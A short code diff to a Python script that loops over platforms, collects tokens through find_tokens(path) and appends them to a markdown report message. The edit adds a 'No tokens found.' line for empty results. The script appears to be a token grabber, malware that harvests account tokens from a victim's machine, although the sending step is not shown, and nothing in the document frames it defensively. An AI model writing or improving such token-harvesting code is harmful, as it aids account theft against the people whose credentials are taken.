@@ -46,9 +46,14 @@ def main():
             continue
 
         message += f'\n**{platform}**\n```\n'
-        
-        for token in find_tokens(path):
-            message += f'{token}\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
 
         message += '```'
 
